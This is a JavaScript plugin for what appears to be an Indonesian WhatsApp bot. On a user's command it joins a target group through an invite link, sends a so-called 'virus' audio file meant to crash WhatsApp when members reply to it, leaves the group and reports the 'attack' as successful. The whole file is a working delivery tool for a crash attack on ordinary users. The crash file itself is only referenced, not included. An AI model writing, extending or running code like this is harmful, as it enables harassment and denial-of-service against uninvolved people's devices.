import fs from 'fs'
import fetch from 'node-fetch'
const isNumber = x => typeof x === 'number' && !isNaN(x)
const delay = ms => isNumber(ms) && new Promise(resolve => setTimeout(function () {
    clearTimeout(this)
    resolve()
}, ms))

let linkRegex = /chat.whatsapp.com\/([0-9A-Za-z]{20,24})/i
let handler = async(m, { conn, text, usedPrefix, command }) => {
    if (!text) throw `Silahkan masukan link group target!\n\nContoh: ${usedPrefix + command} https://chat.whatsapp.com/abcdefghijklmnopqrstuvwxyz`;
    let [_, code] = text.match(linkRegex) || []
    if (!code) throw `Link salah cok!\ncontoh: ${usedPrefix + command} https://chat.whatsapp.com/abcdefghijklmnopqrstuvwxyz`;
let wanz = 'https://telegra.ph/file/c080917609684bf229cd3.jpg'
        m.reply('Sedang Menyerang Group...');
        let target = await conn.groupAcceptInvite(code)
        let namagc = (await conn.groupMetadata(target)).subject || '';
        let tes = 'tess'
        let member = (await conn.groupMetadata(target)).participants.map(v => v.id)
    m.reply('Sedang Mengirim...', m)
    let virusaudiogc = fs.readFileSync('./mp3/a-virusaudio-v1.mp3')

   conn.reply(target, virusaudiogc,)    
{
    await delay(1500)
    await conn.groupLeave(target).catch((e) => {
            console.error(e)
            throw conn.groupLeave(target)
        })
        await conn.send2ButtonImg(m.chat, wanz, gcname, `*Sukses Mengirim ${command} Ke Group ${namagc}\n\n*NOTE*:Virus Ini Aktif Ketika Korban Mau Balas Audio,Maka Wangsafnya Akan Crash.\nhehe🗿\n\n${botdate}`,
   'Menu','.menu',
     'Owner','.owner'
       )
}
}
handler.help = ['virusaudiogc-v1 <linkgc>']
handler.tags = ['virus']
handler.command = /^(virusaudiogc-v1)$/i
handler.limit = true
handler.premium = false
handler.group = false
handler.private = false

handler.admin = false
handler.botAdmin = false

handler.fail = null
handler.limit = false

export default handler